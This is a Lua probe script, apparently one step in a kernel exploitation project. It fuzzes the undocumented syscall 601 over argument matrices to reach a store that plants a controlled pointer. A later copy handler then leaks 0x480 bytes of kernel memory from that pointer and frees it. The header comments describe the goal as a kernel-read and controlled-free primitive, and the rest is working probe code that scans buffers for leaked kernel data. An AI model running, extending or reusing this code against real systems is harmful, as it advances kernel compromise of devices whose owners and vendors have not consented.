-- CRASH_CLASS: MODERATE -- 0x12 and its neighbours are non-lethal so far; 0x11 arg2, 0x03, 0x04,
-- 0x08, 0x0C, 0x1B and 0x27 are excluded, and the consumer sweep only runs if 0x12 actually fires.
-- PROBE 1388a: 601 cmd 0x12 (and the rest of the writer family) over the full three-argument
-- matrix, then hunt for the consumer that copies 0x480 bytes out of [proc+0x578].
--
-- The only kernel-write candidate left in syscall 601 is the 13.60 block at ca0de6:
--   copyin(arg2 -> [rbp-0xf0], 0x20); if ([proc+0x528] & 0x400) ...; [proc+0x528] |= 0x1000000;
--   [proc+0x578] = qword0; [proc+0x580] = qword1
-- and its consumer at ca1b8b:
--   copyout(rdi=[proc+0x578], rsi=udst, rdx=0x480); kfree([proc+0x578])
-- i.e. whatever qword we plant becomes the source of a 0x480-byte kernel copy, and is then freed.
-- That is a kernel-read *and* a controlled-free shape if the store can be reached.
--
-- On 14.10 the store has not been reached: 1355a sent arg1=0/arg2=mapped and got -1; 1384a sent
-- arg1=mapped/arg2=0 and got EINVAL(22); 1385a sent 0/0 and got EFAULT(14). Never all three slots
-- varied at once, and never with a plausible 0x20-byte payload in the copied-in block.
--
-- This probe walks the whole arg1 x arg2 x arg3 = {0, page} cube for 0x10, 0x12, 0x13, 0x14 and
-- 0x15 with errno attached, then - only if some 0x12 shape returned 0 - runs every non-lethal
-- command with arg1 = a 0x800 output page and prints the write size, looking for the 0x480 consumer.
--
-- -- prior art:
--   results/phase35_dead_end_reruns/1355a_sys601_cmd12_shape_20261109_110324.txt
--   results/phase35_dead_end_reruns/1384a_sys601_cmd01_payload_20261109_140135.txt
--   results/phase35_dead_end_reruns/1385a_sys601_attach_by_open_20261109_140401.txt
--   results/kernel_handlers/asm/sys_601_deep.asm (ca0de6 store, ca1b8b copyout + kfree)
--   results/kernel_handlers/analysis/sys_601_deep.md (command map)

print("=== PROBE 1388a: 601 WRITER FAMILY + CONSUMER HUNT ===")

local function N(v) if type(v) == "table" and v.tonumber then return v:tonumber() end return tonumber(v) or 0 end
local function mk(n) local t={} for k,v in pairs(syscall.pipe) do t[k]=v end t.syscall_no=n setmetatable(t,getmetatable(syscall.pipe)) return t end
local function es() local ok,s = pcall(function() return get_error_string() end) if ok and type(s)=="string" then return s end return "errno?" end
local function hex(v) v = v % 4294967296 return string.format("%08X", v) end
local function rd(a) local ok,v = pcall(function() return N(memory.read_dword(a)) end) if ok then return v % 4294967296 end return nil end

local PID = N(mk(20)(uint64(0), uint64(0), uint64(0), uint64(0), uint64(0), uint64(0)))
print(string.format("[0] pid=%d", PID))

-- SIG_IGN for the nosys trampoline: absent slots then answer ENOSYS instead of raising SIGSYS.
local sa = memory.alloc(0x80)
for i = 0, 0x60, 8 do pcall(function() memory.write_qword(sa + i, uint64(0)) end) end
pcall(function() memory.write_qword(sa, uint64(1)) end)
local ign = 0
local sigs = {5, 6, 7, 8, 12, 24, 25, 26, 30, 31}
for _, s in ipairs(sigs) do
    local ok, rv = pcall(function() return mk(416)(uint64(s), uint64(sa), uint64(0)) end)
    if ok and N(rv) == 0 then ign = ign + 1 end
end
print(string.format("[0] SIG_IGN installed on %d/%d signals", ign, #sigs))

local INBLOB = memory.alloc(0x100)
local IN = N(INBLOB)
local OUTBLOB = memory.alloc(0x800)
local OUT = N(OUTBLOB)
local PAINT_IN = string.rep(string.char(0x5A), 0x100)
local PAINT_OUT = string.rep(string.char(0xA5), 0x800)

local sc = mk(601)

local function paint(b, s)
    pcall(function() memory.write_buffer(b, s) end)
end

-- scans a buffer for changed dwords; returns count and the first 8 non-zero dwords
local function scan(base, words)
    local n, acc = 0, {}
    for i = 0, words - 1 do
        local v = rd(base + i * 4)
        if v and v ~= 0 then
            n = n + 1
            if #acc < 8 then acc[#acc + 1] = hex(v) end
        end
    end
    return n, table.concat(acc, " ")
end

local function call6(cmd, a1, a2, a3)
    local ok, rv = pcall(function()
        return sc(uint64(cmd), uint64(a1), uint64(a2), uint64(a3), uint64(0), uint64(0))
    end)
    return ok and N(rv) or -99999
end

print("")
print("[A] cmd x (arg1,arg2,arg3) over {0,page}")
print(string.format("    page = 0x%08X filled with 0x5A, output page 0x%08X", IN, OUT))

local CMDS = {0x10, 0x12, 0x13, 0x14, 0x15}
local HIT = false
for _, cmd in ipairs(CMDS) do
    for m = 0, 7 do
        local a1 = (m % 2 == 1) and IN or 0
        local a2 = ((m / 2) % 2 >= 1) and IN or 0
        local a3 = ((m / 4) % 2 >= 1) and IN or 0
        paint(INBLOB, PAINT_IN)
        paint(OUTBLOB, PAINT_OUT)
        local rv = call6(cmd, a1, a2, a3)
        local e = es()
        local nz, first = scan(IN, 0x40)
        local onz, ofirst = scan(OUT, 0x20)
        print(string.format("  0x%02X %d%d%d  rv=%-8d %-24s in_nz=%d out_nz=%d %s %s",
            cmd, a1 ~= 0 and 1 or 0, a2 ~= 0 and 1 or 0, a3 ~= 0 and 1 or 0,
            rv, e, nz, onz, first, ofirst))
        if cmd == 0x12 and rv == 0 then HIT = true end
        if rv == -99999 then
            print("  [FATAL] the call did not return; stopping")
            return
        end
    end
end

print("")
if not HIT then
    print("[B] SKIP - no 0x12 shape returned 0, so nothing was planted and there is no consumer to find")
    print("=== PROBE 1388a COMPLETE ===")
    return
end

-- A 0x12 shape returned 0: something may now sit at [proc+0x578]. Run every non-lethal command
-- with arg1 = the 0x800 output page and look for the 0x480-byte consumer.
print("[B] a 0x12 shape returned 0 - hunting the consumer")
local SKIP = {[0x03]=true, [0x04]=true, [0x08]=true, [0x0C]=true, [0x11]=true, [0x1B]=true, [0x27]=true}
for cmd = 0x00, 0x1A do
    if not SKIP[cmd] then
        paint(OUTBLOB, PAINT_OUT)
        local rv = call6(cmd, OUT, 0, 0)
        local e = es()
        local onz, ofirst = scan(OUT, 0x120)
        print(string.format("  0x%02X a1  rv=%-8d %-24s nz=%-4d %s", cmd, rv, e, onz, ofirst))
        if rv == -99999 then
            print("  [FATAL] the call did not return; stopping")
            return
        end
    end
end

print("=== PROBE 1388a COMPLETE ===")
